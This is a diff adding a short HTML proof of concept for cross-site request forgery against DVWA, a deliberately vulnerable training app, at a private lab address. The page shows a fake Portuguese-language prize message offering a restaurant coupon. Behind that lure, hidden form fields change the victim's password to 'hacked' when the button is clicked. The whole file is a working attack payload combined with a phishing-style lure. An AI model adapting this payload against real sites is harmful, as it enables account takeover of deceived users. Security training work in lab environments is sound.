@@ -1,0 +1,9 @@
+POC CSRF
+
+<form action="http://192.168.32.128/dvwa/vulnerabilities/csrf/" method="GET">
+    <h1>Parabéns, você ganhou um cupom de R$50,00 no Madero, clique no botão abaixo para participar</h1>
+    <input type="hidden" AUTOCOMPLETE="off" name="password_new" value="hacked">
+    <input type="hidden" AUTOCOMPLETE="off" name="password_conf" value="hacked">
+    <br>
+    <input type="submit" value="Clique" name="Change">
+    </form>
